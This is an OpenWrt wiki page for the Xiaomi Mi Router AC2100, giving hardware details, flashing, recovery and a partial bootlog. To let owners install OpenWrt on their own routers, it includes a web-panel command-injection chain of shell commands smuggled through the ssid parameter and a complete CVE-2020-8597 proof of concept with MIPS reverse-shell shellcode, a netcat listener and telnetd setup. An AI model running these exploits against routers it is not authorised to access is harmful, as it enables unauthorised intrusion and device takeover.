====== Xiaomi Mi Router AC2100 ======

The //Xiaomi Mi Router AC2100// is a wireless router with MT7621 platform. While it can be acquired for relatively low cost compared to other units with similar specifications, it has two diffrent installation process in order to bypass a locked down stock firmware to install OpenWrt. One of them works in every version of firmwares, other one needs downgrade firmware.

From a technical standpoint, the spec of //Xiaomi Mi Router AC2100// is highly identical to //[[toh:xiaomi:xiaomi_redmi_router_ac2100|Redmi AC2100]]//. It runs Xiaomi Router firmware by default and similarly, it requires a simple "PPPOE" or "Web Panel Shelling" exploit to start a shell and flash OpenWrt via command line interface.

**Do not mix up //Xiaomi Mi Router AC2100// and //[[toh:xiaomi:xiaomi_redmi_router_ac2100|Redmi AC2100]]//.** See the visual comparison of the two routers here: {{:media:xiaomi:rm2100-vs-r2100.jpg?600&linkonly|rm2100-vs-r2100.jpg}}\\ 
**Make sure you are on the correct device page for your device, check twice before download firmware!!!**



**Support Forums** https://forum.openwrt.org/t/new-xiaomi-router-ac2100

{{media:xiaomi:mi_router_ac2100_front.jpg?200|Xiaomi Mi Router AC2100}}

===== Supported Versions =====

---- datatable ----
cols    : Brand, Model, Versions, Supported Current Rel, OEM device homepage URL_url, Forum Search_search-forums, Device Techdata_pageid
headers : Brand, Model, Version, Current Release, OEM Info, Forum Search, Technical Data
align   : c,c,c,c,c,c,c
filter  : Model=Mi Router AC2100
----

/**
---- datatable ----
cols    : Unsupported Functions_unsupporteds
filter  : Model=Mi Router AC2100
----
*/


===== Hardware Highlights =====
---- datatable ----
cols    : Model, Versions, CPU, CPU MHz, Flash MB_mbflashs, RAM MB_mbram, WLAN Hardware, WLAN 2.4GHz, WLAN 5.0GHz, Ethernet 100M ports_, Ethernet Gbit ports_, Modem, USB ports_
header  : Model, Version,SoC,CPU MHz,Flash MB,RAM MB,WLAN Hardware,WLAN2.4,WLAN5.0,100M ports,Gbit ports,Modem,USB
align   : c,c,c,c,c,c,c,c,c,c,c,c,c
filter  : Model=Mi Router AC2100
----


===== Installation =====
---- datatable ----
cols    : Model, Versions, Supported Current Rel, Firmware OpenWrt Install URL_url, Firmware OpenWrt Upgrade URL_url, Firmware OEM Stock URL_url
headers : Model, Version, Current Release, Firmware OpenWrt Install, Firmware OpenWrt Upgrade, Firmware OEM Stock
align   : c,c,c
filter  : Model=Mi Router AC2100
----


To install OpenWrt, you first need to get ssh access, then install OpenWrt from ssh.

There are 2 methods for gaining ssh access:
  - older firmware web exploit (recommended simpler method)
  - pppoe exploit script using a complicated python script


==== Web Panel exploit with firmware downgrade process (Easier Way) ====

This much simpler method is showed here: https://www.youtube.com/watch?v=tPl9FZA4B8Q

You first need to downgrade firmware to http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/r2100/miwifi_r2100_firmware_4b519_2.0.722.bin

then follow this guide: taken from [[https://forum.openwrt.org/t/xiaomi-ax3600-ssh-guide/65438/2|AX3600 Forum]], they have same exploit.

<code>
Login in to your router management panel and get the STOK variable like in following example:
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/web/home#router

After you got your unique <STOK> variable from the router's management panel visit these urls one by one. Don't forget to change <STOK> value before you visit every URL.
1) http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit%3B
2) http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3Bsed%20-i%20's/channel=.*/channel=%5C%22debug%5C%22/g'%20/etc/init.d/dropbear%3B
3) http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B/etc/init.d/dropbear%20start%3B
4) http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20echo%20-e%20'admin%5Cnadmin' %20%7C%20passwd%20root%3B

If everything goes well you should be able to connect with SSH now. Username: root / password: admin
</code>

When you got SSH access, download OpenWrt firmware files with this URLs. Remember this firmware don't have https connection support. You may need to download it first to pc and transfer it to the router with the local http server.

<code>
cd /tmp
wget http://downloads.openwrt.org/snapshots/targets/ramips/mt7621/openwrt-ramips-mt7621-xiaomi_mi-router-ac2100-squashfs-kernel1.bin
wget http://downloads.openwrt.org/snapshots/targets/ramips/mt7621/openwrt-ramips-mt7621-xiaomi_mi-router-ac2100-squashfs-rootfs0.bin

# Enable uart and bootdelay, useful for testing or recovery if you have an uart adapter!
nvram set uart_en=1
nvram set bootdelay=5
# Set kernel1 as the booting kernel
nvram set flag_try_sys1_failed=1
# Commit our nvram changes
nvram commit
# Flash the kernel
mtd write openwrt-ramips-mt7621-xiaomi_mi-router-ac2100-squashfs-kernel1.bin kernel1
# Flash the rootfs
mtd -r write openwrt-ramips-mt7621-xiaomi_mi-router-ac2100-squashfs-rootfs0.bin rootfs0
# and reboot the device
reboot
</code>

If all has gone well, you should be rebooting into OpenWrt.


==== PPPoE Exploit with python script. (Complicated Way) ====
  * A computer with an ethernet adapter
  * Two ethernet cables
  * Python 3 with this extensions(scapy, netcat, a statically compiled mipsel busybox binary and a http.server)
  * The OpenWrt images for this device
  * A script that implements [[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8597|CVE-2020-8597]] (see below)

An POC of CVE-2020-8597, from [[https://gist.github.com/namidairo/1e3fb3404c9f148474c06ae6616962f3|GitHub Gist]]

You need to change the interface to match the name of the interface connected to the Xiaomi router. Also, change the (beginning of) MAC address on the line ''if src.startswith("88:c3:97")'' to match your router. The full MAC address of the router is on a sticker attached to the router.

There's a good [[https://github.com/impulse/ac2100-openwrt-guide|AC2100-OpenWRT-Guide at GitHub]] with pictures to explain the installation procedure. Guide based on MacOS, it is very likely same at Linux but could be different at Windows.

== Exploit script ==

We will be referring to this as ''pppd-cve.py'' throughout the process.

<code>
# Based on a PoC by "WinMin" (https://github.com/WinMin/CVE-2020-8597)
from scapy.all import *
from socket import *

interface = "eth0"

def mysend(pay,interface = interface):
    sendp(pay, iface = interface)

def packet_callback(packet):

    global sessionid, src, dst
    sessionid = int(packet['PPP over Ethernet'].sessionid)
    dst = (packet['Ethernet'].dst)
    src = (packet['Ethernet'].src)
    # In case we pick up Router -> PPPoE server packet
    if src.startswith("88:c3:97") or src.startswith("8c:53:c3") :
        src,dst = dst,src
    print("sessionid:" + str(sessionid))
    print("src:" + src)
    print("dst:" + dst)

def eap_response_md5():

    md5 = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"

    # Reverse shell, connect to 192.168.31.177:31337, written by Jacob Holcomb

    stg3_SC =  b"\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
    stg3_SC += b"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
    stg3_SC += b"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
    stg3_SC += b"\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
    stg3_SC += b"\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
    stg3_SC += b"\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
    stg3_SC += b"\xf8\xff\xa5\xaf\x1f\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"
    stg3_SC += b"\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
    stg3_SC += b"\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
    stg3_SC += b"\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
    stg3_SC += b"\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
    stg3_SC += b"\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
    stg3_SC += b"\xab\x0f\x02\x24\x0c\x09\x09\x01"

    reboot_shell =  b"\x23\x01\x06\x3c"
    reboot_shell += b"\x67\x45\xc6\x34"
    reboot_shell += b"\x12\x28\x05\x3c"
    reboot_shell += b"\x69\x19\xa5\x24"
    reboot_shell += b"\xe1\xfe\x04\x3c"
    reboot_shell += b"\xad\xde\x84\x34"
    reboot_shell += b"\xf8\x0f\x02\x24"
    reboot_shell += b"\x0c\x01\x01\x01"

    s0 = b"\x40\x61\xF1\x77" # uclibc sleep() base + 0x6c140 = 77F16140
    s1 = b"\x01\x00\x00\x00"
    s2 = b"\x41\x41\x41\x41"
    s3 = b"\x00\x64\xFF\x7F" # 7ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]
    s4 = b"\x88\xe1\x40\x00" # pppd.txt:0x0040e188
    s5 = b"\x00\x00\x00\x00"

    ra = b"\x0C\x81\xF1\x77" # libuClibc.txt:0x0006e10c 77F1810C

    rop_chain =  (b'A' * 0x184)
    rop_chain += s0
    rop_chain += s1
    rop_chain += s2
    rop_chain += s3
    rop_chain += s4
    rop_chain += s5
    rop_chain += ra
    # Nop slide
    rop_chain += (b'\x00' * 0x100)
    # Small reboot shellcode for testing
    #rop_chain += reboot_shell
    rop_chain += stg3_SC
    # Just padding the end a little, since the last byte gets set to 0x00 and not everyone uses a 4 * 0x00 as nop
    rop_chain += (b'\x00' * 0x4)
    pay = Ether(dst=dst,src=src,type=0x8864)/PPPoE(code=0x00,sessionid=sessionid)/PPP(proto=0xc227)/EAP_MD5(id=100,value=md5,optional_name=rop_chain)
    mysend(pay)


if __name__ == '__main__':
    sniff(prn=packet_callback,iface=interface,filter="pppoes",count=1)

    eap_response_md5()
</code>

== PPPoE simulator ==

From https://github.com/Percy233/PPPoE_Simulator-for-RM2100-exploit

We will refer to this as pppoe-simulator.py throughout this process.

<code>
from scapy.all import *
from scapy.layers.ppp import *

# In most cases you just have to change this:
interface = "eth0"


ac_name = "PPPoE-Simulator"
service_name = ""
magic_number = 0xDEADBEEF
host_uniq = session_id = ac_cookie = mac_router = mac_server = eth_discovery = eth_session = None
ident = 0

End_Of_List = 0x0000
Service_Name = 0x0101
AC_Name = 0x0102
Host_Uniq = 0x0103
AC_Cookie = 0x0104
Vendor_Specific = 0x0105
Relay_Session_Id = 0x0110
Service_Name_Error = 0x0201
AC_System_Error = 0x0202
Generic_Error = 0x0203

PADI = 0x09
PADO = 0x07
PADR = 0x19
PADS = 0x65
PADT = 0xa7

LCP = 0xc021
PAP = 0xc023
CHAP = 0xc223
IPCP = 0x8021
IPV6CP = 0x8057
PPPoE_Discovery = 0x8863
PPPoE_Session = 0x8864

Configure_Request = 1
Configure_Ack = 2
Authenticate_Ack = 2
Configure_Nak = 3
Configure_Reject = 4
Terminate_Request = 5
Terminate_Ack = 6
Code_Reject = 7
Protocol_Reject = 8
Echo_Request = 9
Echo_Reply = 10
Discard_Request = 11


def packet_callback(pkt):
    global host_uniq, session_id, ident, ac_cookie, mac_router, mac_server, eth_discovery, eth_session
    mac_router = pkt[Ether].src
    eth_discovery = Ether(src=mac_server, dst=mac_router, type=PPPoE_Discovery)
    eth_session = Ether(src=mac_server, dst=mac_router, type=PPPoE_Session)

    if pkt.haslayer(PPPoED):
        if pkt[PPPoED].code == PADI:
            session_id = pkt[PPPoED].fields['sessionid']
            ac_cookie = os.urandom(20)
            for tag in pkt[PPPoED][PPPoED_Tags].tag_list:
                if tag.tag_type == Host_Uniq:
                    host_uniq = tag.tag_value
            print("Client->Server   |   Discovery Initiation")
            print("Server->Client   |   Discovery Offer")
            sendp(eth_discovery /
                  PPPoED(code=PADO, sessionid=0) /
                  PPPoETag(tag_type=Service_Name, tag_value=service_name) /
                  PPPoETag(tag_type=AC_Name, tag_value=ac_name) /
                  PPPoETag(tag_type=AC_Cookie, tag_value=ac_cookie) /
                  PPPoETag(tag_type=Host_Uniq, tag_value=host_uniq))
        elif pkt[PPPoED].code == PADR:
            print("Client->Server   |   Discovery Request")
            print("Server->Client   |   Discovery Session-confirmation")
            session_id = os.urandom(2)[0]
            sendp(eth_discovery /
                  PPPoED(code=PADS, sessionid=session_id) /
                  PPPoETag(tag_type=Service_Name, tag_value=service_name) /
                  PPPoETag(tag_type=Host_Uniq, tag_value=host_uniq))
            print("Server->Client   |   Configuration Request (PAP)")
            sendp(eth_session /
                  PPPoE(sessionid=session_id) /
                  PPP(proto=LCP) /
                  PPP_LCP(code=Configure_Request, id=ident + 1, data=(Raw(PPP_LCP_MRU_Option(max_recv_unit=1492)) /
                                                                      Raw(PPP_LCP_Auth_Protocol_Option(
                                                                       auth_protocol=PAP)) /
                                                                      Raw(PPP_LCP_Magic_Number_Option(
                                                                       magic_number=magic_number)))))

    elif pkt.haslayer(PPPoE) and pkt.haslayer(PPP):
        if pkt[PPPoE].sessionid != 0:
            session_id = pkt[PPPoE].sessionid
        if pkt.haslayer(PPP_LCP_Configure):
            ppp_lcp = pkt[PPP_LCP_Configure]
            if pkt[PPP_LCP_Configure].code == Configure_Request:
                ident = pkt[PPP_LCP_Configure].id
                print("Client->Server   |   Configuration Request (MRU)")
                print("Server->Client   |   Configuration Ack (MRU)")
                sendp(eth_session /
                      PPPoE(sessionid=session_id) /
                      PPP(proto=LCP) /
                      PPP_LCP(code=Configure_Ack, id=ident, data=(Raw(PPP_LCP_MRU_Option(max_recv_unit=1480)) /
                                                                  Raw(ppp_lcp[PPP_LCP_Magic_Number_Option]))))
            elif pkt[PPP_LCP_Configure].code == Configure_Ack:
                print("Client->Server   |   Configuration Ack")
                print("Server->Client   |   Echo Request")
                sendp(eth_session /
                      PPPoE(sessionid=session_id) /
                      PPP(proto=LCP) /
                      PPP_LCP_Echo(code=Echo_Request, id=ident + 1, magic_number=magic_number))
        elif pkt.haslayer(PPP_LCP_Echo):
            if pkt[PPP_LCP_Echo].code == Echo_Request:
                ident = pkt[PPP_LCP_Echo].id
                print("Client->Server   |   Echo Request")
                print("Server->Client   |   Echo Reply")
                sendp(eth_session /
                      PPPoE(sessionid=session_id) /
                      PPP(proto=LCP) /
                      PPP_LCP_Echo(code=Echo_Reply, id=ident, magic_number=magic_number))
        elif pkt.haslayer(PPP_PAP_Request):
            ident = pkt[PPP_PAP_Request].id
            print("Client->Server   |   Authentication Request")
            print("Server->Client   |   Authenticate Ack")
            sendp(eth_session /
                  PPPoE(sessionid=session_id) /
                  PPP(proto=PAP) /
                  PPP_PAP_Response(code=Authenticate_Ack, id=ident, message="Login ok"))
            print("Server->Client   |   Configuration Request (IP)")
            sendp(eth_session /
                  PPPoE(sessionid=session_id) /
                  PPP(proto=IPCP) /
                  PPP_IPCP(code=Configure_Request, id=ident + 1, options=PPP_IPCP_Option_IPAddress(data="10.15.0.8")))
        elif pkt.haslayer(PPP_IPCP):
            ident = pkt[PPP_IPCP].id
            if pkt[PPP_IPCP].options[0].data == "0.0.0.0":
                options = [PPP_IPCP_Option_IPAddress(data="10.16.0.9"),
                           PPP_IPCP_Option_DNS1(data="114.114.114.114"),
                           PPP_IPCP_Option_DNS2(data="114.114.114.114")]
                print("Client->Server   |   Configuration Request (invalid)")
                print("Server->Client   |   Configuration Nak")
                sendp(eth_session /
                      PPPoE(sessionid=session_id) /
                      PPP(proto=IPCP) /
                      PPP_IPCP(code=Configure_Nak, id=ident, options=options))
            else:
                print("Client->Server   |   Configuration Request (valid)")
                print("Server->Client   |   Configuration Ack")
                sendp(eth_session /
                      PPPoE(sessionid=session_id) /
                      PPP(proto=IPCP) /
                      PPP_IPCP(code=Configure_Ack, id=ident, options=pkt[PPP_IPCP].options))
        if pkt[PPP].proto == IPV6CP:
            print("Client->Server   |   Configuration Request IPV6CP")
            print("Server->Client   |   Protocol Reject IPV6CP")
            sendp(eth_session /
                  PPPoE(sessionid=session_id) /
                  PPP(proto=LCP) /
                  PPP_LCP_Protocol_Reject(code=Protocol_Reject, id=ident + 1, rejected_protocol=IPV6CP,
                                          rejected_information=pkt[PPP].payload))


def terminateConnection():
    print("Server->Client   |   Terminate Connection")
    sendp(eth_session /
          PPPoE(sessionid=session_id) /
          PPP(proto=LCP) /
          PPP_LCP_Terminate())


def isNotOutgoing(pkt):
    if pkt.haslayer(Ether):
        return pkt[Ether].src != mac_server
    return False


if __name__ == '__main__':
    conf.verb = 0  # Suppress Scapy output
    conf.iface = interface  # Set default interface
    mac_server = get_if_hwaddr(interface)
    print("Waiting for packets")
    sniff(prn=packet_callback, filter="pppoed or pppoes", lfilter=isNotOutgoing)
</code>

=== Instructions ===

//These instructions assume that the ethernet interface being used is named eth0, please adjust the interface name to your own setup as required within the python scripts. Some of these commands may require to be run as root.//

== Initial setup ==

  - Setup your ethernet interface with the ip address: 192.168.31.177
  - Bridge the WAN port on the router with one of the LAN ports on the router by connecting an ethernet cable between them.
  - Connect your computer to the router with your other ethernet cable.

<code>
# Start our PPPoE emulator
python pppoe-simulator.py
</code>

Now we can run our router through the initial setup wizard on ''%%http://192.168.31.1%%'', during which PPPoE should be auto-detected and chosen. Any combination of credentials are acceptable.

<code>
# A quick http server for the current directory (ie. Where you have placed your OpenWrt images)
python -m http.server 80
# And in another window...
netcat -nvlp 31337
</code>

== Running the exploit ==

<code>
# In another window to trigger the exploit
python pppd-cve.py
</code>

In your terminal with netcat open you should see an incoming connection from the router, and we can begin typing in commands to be run on the router.

It is recommended to quickly wget the busybox binary over and start telnetd as the reverse shell is somewhat unstable and disconnect randomly.

<code>
cd /tmp
wget http://192.168.31.177/busybox
chmod a+x ./busybox
./busybox telnetd -l /bin/sh
</code>

If you are disconnected prematurely, just start the netcat listener and exploit script again.

After you have secured telnet access to the device you can wget the OpenWrt images onto the device and flash them.

== Writing the OpenWrt images ==
After connecting to telnet on 192.168.31.1 :

<code>
wget http://192.168.31.177/openwrt-ramips-mt7621-xiaomi_mi-router-ac2100-squashfs-kernel1.bin
wget http://192.168.31.177/openwrt-ramips-mt7621-xiaomi_mi-router-ac2100-squashfs-rootfs0.bin
# Enable uart and bootdelay, useful for testing or recovery if you have an uart adapter!
nvram set uart_en=1
nvram set bootdelay=5
# Set kernel1 as the booting kernel
nvram set flag_try_sys1_failed=1
# Commit our nvram changes
nvram commit
# Flash the kernel
mtd write openwrt-ramips-mt7621-xiaomi_mi-router-ac2100-squashfs-kernel1.bin kernel1
# Flash the rootfs and reboot
mtd -r write openwrt-ramips-mt7621-xiaomi_mi-router-ac2100-squashfs-rootfs0.bin rootfs0
</code>

If all has gone well, you should be rebooting into OpenWrt.



==== Flash Layout ====
<WRAP BOX>
FIXME //[[:docs:techref:flash.layout#discovery_how_to_find_out|Find out flash layout]], then add the flash layout table here (copy, paste, modify the [[docs:techref:flash.layout#partitioning_of_the_flash|example]]).//

Please check out the article [[docs:techref:flash.layout|Flash layout]]. It contains examples and explanations that describe how to document the flash layout.
</WRAP>

*/
<WRAP>
FIXME Enter values for "FILL-IN" below

^ Bootloader tftp server IPv4 address  | FILL-IN   |
^ Bootloader MAC address (special)     | FILL-IN   |
^ Firmware tftp image                  | [[:downloads|Latest OpenWrt release]] (**''NOTE:''** Name must contain //"tftp"//) |
^ TFTP transfer window                 | FILL-IN seconds                                |
^ TFTP window start                    | approximately FILL-IN seconds after power on   |
^ TFTP client required IP address      | FILL-IN                                        |

</WRAP>

===== Upgrading OpenWrt =====
->  [[docs:guide-user:installation:generic.sysupgrade]]

<WRAP BOX>

FIXME These are generic instructions. Update with your router's specifics.

==== LuCI Web Upgrade Process ====

  * Browse to ''<nowiki>http://192.168.1.1/cgi-bin/luci/mini/system/upgrade/</nowiki>'' LuCI Upgrade URL
  * Upload image file for sysupgrade to LuCI
  * Wait for reboot

==== Terminal Upgrade Process ====

If you don't have a GUI (LuCI) available, you can alternatively upgrade via the command line.
There are two command line methods for upgrading:

  * ''sysupgrade''
  * ''mtd''

Note: It is important that you put the firmware image into the ramdisk (/tmp) before you start flashing.

=== sysupgrade ===

  * Login as root via SSH on 192.168.1.1, then enter the following commands:

<code>
cd /tmp
wget http://downloads.openwrt.org/snapshots/trunk/XXX/xxx.abc
sysupgrade /tmp/xxx.abc
</code>

=== mtd ===

If ''sysupgrade'' does not support this router, use ''mtd''.

  * Login as root via SSH on 192.168.1.1, then enter the following commands:

<code>
cd /tmp
wget http://downloads.openwrt.org/snapshots/trunk/XXX/xxx.abc
mtd write /tmp/xxx.abc linux && reboot
</code>

</WRAP>

===== Debricking =====
-> [[docs:guide-user:troubleshooting:generic.debrick]]

==== Stock recovery ====

This device accepts stock signed firmware images from Xiaomi, in the form of PXE boot.

It can be triggered by holding down the reset button on the device while powering on, until the status light flashes amber.

Below is an example dnsmasq configuration that will serve /tmp/test.bin

<code>
port=0
interface=eth0
bind-interfaces
dhcp-range=192.168.31.50,192.168.31.150,12h
dhcp-boot=test.bin
enable-tftp
tftp-root=/tmp
</code>

After the device flashes the image from tftp, it will flash the status light white and you can then power-cycle the device.

===== Failsafe mode =====
-> [[docs:guide-user:troubleshooting:failsafe_and_factory_reset]]

===== Basic configuration =====
-> [[docs:guide-user:base-system:start|Basic configuration]] After flashing, proceed with this.\\
Set up your Internet connection, configure wireless, configure USB port, etc.

===== Specific Configuration =====

<WRAP BOX>
FIXME Please fill in real values for this device, then remove the EXAMPLEs

==== Network interfaces ====
The default network configuration is:
^ Interface Name   ^ Description                  ^ Default configuration    ^
| br-lan           | EXAMPLE LAN & WiFi           | EXAMPLE 192.168.1.1/24   |
| vlan0 (eth0.0)   | EXAMPLE LAN ports (1 to 4)   | EXAMPLE None             |
| vlan1 (eth0.1)   | EXAMPLE WAN port             | EXAMPLE DHCP             |
| wl0              | EXAMPLE WiFi                 | EXAMPLE Disabled         |

</WRAP>

==== Switch Ports (for VLANs) ====
<WRAP BOX>
FIXME Please fill in real values for this device, then remove the EXAMPLEs

Numbers 0-3 are Ports 1-4 as labeled on the unit, number 4 is the Internet (WAN) on the unit, 5 is the internal connection to the router itself. Don't be fooled: Port 1 on the unit is number 3 when configuring VLANs. vlan0 = eth0.0, vlan1 = eth0.1 and so on.
^ Port             ^ Switch port   ^
| Internet (WAN)   | EXAMPLE 4     |
| LAN 1            | EXAMPLE 3     |
| LAN 2            | EXAMPLE 2     |
| LAN 3            | EXAMPLE 1     |
| LAN 4            | EXAMPLE 0     |

</WRAP>

==== Buttons ====
-> [[docs:guide-user:hardware:hardware.button]] on howto use and configure the hardware button(s).
Here, we merely name the buttons, so we can use them in the above Howto.

<WRAP BOX>
FIXME Please fill in real values for this device, then remove the EXAMPLEs

The Xiaomi Xiaomi Mi Router AC2100 has the following buttons:

^ BUTTON                       ^ Event   ^
| EXAMPLE Reset                |  reset  |
| EXAMPLE Secure Easy Setup    |   ses   |
| EXAMPLE No buttons at all.   |    -    |

</WRAP>

===== Hardware =====
==== Info ====
---- datatemplatelist dttpllist ----
template: meta:template_datatemplatelist
cols    : Brand, Model, Versions, Device Type, Availability, Supported Since Commit_git, Supported since Rel, Supported current Rel, Unsupported, Bootloader, Platform, Target, CPU MHz, Flash MBs, RAM MB, Switch, Ethernet 100M ports_, Ethernet Gbit ports_, Comments network ports_, Modem, VLAN, WLAN 2.4GHz, WLAN 5.0GHz, WLAN Hardwares, WLAN Comments_, Detachable Antennas_, USB ports_, SATA ports_, Comments USB SATA ports_, Serial, JTAG, LED count, Button count, Power supply, Device Techdata_pageid, Forum topic URL_url, wikidevi URL_url, OEM Device Homepage URL_url, Firmware OEM Stock URL_url, Firmware OpenWrt Install URL_url, Firmware OpenWrt Upgrade URL_url, Comments_
filter  : Model=Mi Router AC2100
----

==== Flash Layout ====
<code>
0x000000000000-0x000007f80000 : "ALL" 
0x000000000000-0x000000080000 : "Bootloader" 
0x000000080000-0x0000000c0000 : "Config"
0x0000000c0000-0x000000100000 : "Bdata"
0x000000100000-0x000000140000 : "Factory"
0x000000140000-0x000000180000 : "crash"
0x000000180000-0x0000001c0000 : "crash_syslog"
0x0000001c0000-0x000000200000 : "cfg_bak"
0x000000200000-0x000000600000 : "kernel0"
0x000000600000-0x000000a00000 : "kernel1"
0x000000a00000-0x000002400000 : "rootfs0"
0x000002400000-0x000003e00000 : "rootfs1"
0x000003e00000-0x000006400000 : "overlay"
0x000006400000-0x000007f80000 : "obr"
</code>

==== Photos ====
/* =====>>>>> Standard size for photos: add ?400 to the medialink                                */
/* When uploading photos, **name them** intelligently. Nobody knows what 20100930_000602.jpg is! */
/* e.g. {{:media:yourbrand:yourbrand_yourmodel_front.jpg?400|}}                                  */
/* Thanks, your wiki administration - Oct. 2015 */

{{media:xiaomi:mi_router_ac2100_front.jpg?0x250|}}
{{media:xiaomi:mi_router_ac2100_back.jpg?0x250|}}
{{media:xiaomi:mi_router_ac2100_top.jpg?0x250|}}
{{media:xiaomi:mi_router_ac2100_label.jpg?0x250|}}
{{media:xiaomi:mi_router_ac2100_pcb_top.jpg?0x250|}}
{{media:xiaomi:mi_router_ac2100_pcb_bottom.jpg?0x250|}}

==== Opening the case ====

**Note:** This will void your warranty!

<WRAP BOX>
FIXME //Describe what needs to be done to open the device, e.g. remove rubber feet, adhesive labels, screws, ...//
  * To remove the cover and open the device, do a/b/c
</WRAP>

//Main PCB://\\
**Insert photo of PCB**

==== Serial ====
-> [[docs:techref:hardware:port.serial]] general information about the serial port, serial port cable, etc.

How to connect to the Serial Port of this specific device:\\

{{media:xiaomi:mi_router_ac2100_uart.jpg?600}}

Requires soldering angled connectors.

Connect RX pin on board to TX pin of adapter and vice versa, GND to GND

^ Serial connection parameters\\ for Xiaomi Mi Router AC2100 | 115200, 8N1 |
==== JTAG ====
-> [[docs:techref:hardware:port.jtag]] general information about the JTAG port, JTAG cable, etc.

How to connect to the JTAG Port of this specific device:\\
**Insert photo of PCB with markings for JTAG port**


===== Bootlogs =====
==== OEM bootlog ====
<WRAP bootlog>
<nowiki>===================================================================
     		MT7621   stage1 code May 28 2018 14:51:28 (ASIC)
     		CPU=50000000 HZ BUS=16666666 HZ
==================================================================
Change MPLL source from XTAL to CR...
do MEMPLL setting..
MEMPLL Config : 0x11100000
3PLL mode + External loopback
=== XTAL-40Mhz === DDR-1200Mhz ===
PLL4 FB_DL: 0x7, 1/0 = 653/371 1D000000
PLL2 FB_DL: 0x10, 1/0 = 669/355 41000000
PLL3 FB_DL: 0x14, 1/0 = 550/474 51000000
do DDR setting..[00320381]
Apply DDR3 Setting...(use customer AC)
          0    8   16   24   32   40   48   56   64   72   80   88   96  104  112  120
      --------------------------------------------------------------------------------
0000:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0001:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0002:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0003:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0004:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0005:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0006:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0007:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0008:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0009:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
000A:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
000B:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
000C:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
000D:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    1    1
000E:|    0    0    0    0    0    0    0    0    1    1    1    1    1    1    1    1
000F:|    0    0    0    0    1    1    1    1    1    1    1    1    1    0    0    0
0010:|    1    1    1    1    1    1    1    1    0    0    0    0    0    0    0    0
0011:|    1    1    1    0    0    0    0    0    0    0    0    0    0    0    0    0
0012:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0013:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0014:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0015:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0016:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0017:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0018:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
0019:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
001A:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
001B:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
001C:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
001D:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
001E:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
001F:|    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0    0
DRAMC_DQSCTL1[0e0]=13000000
DRAMC_DQSGCTL[124]=80000033
rank 0 coarse = 15
rank 0 fine = 64
B:|    0    0    0    0    0    0    0    0    0    0    1    1    1    0    0    0
opt_dle value:11
DRAMC_DDR2CTL[07c]=C287223D
DRAMC_PADCTL4[0e4]=000044B3
DRAMC_DQIDLY1[210]=08080808
DRAMC_DQIDLY2[214]=07080806
DRAMC_DQIDLY3[218]=08050503
DRAMC_DQIDLY4[21c]=06060706
DRAMC_R0DELDLY[018]=00001D1E
==================================================================
		RX	DQS perbit delay software calibration 
==================================================================
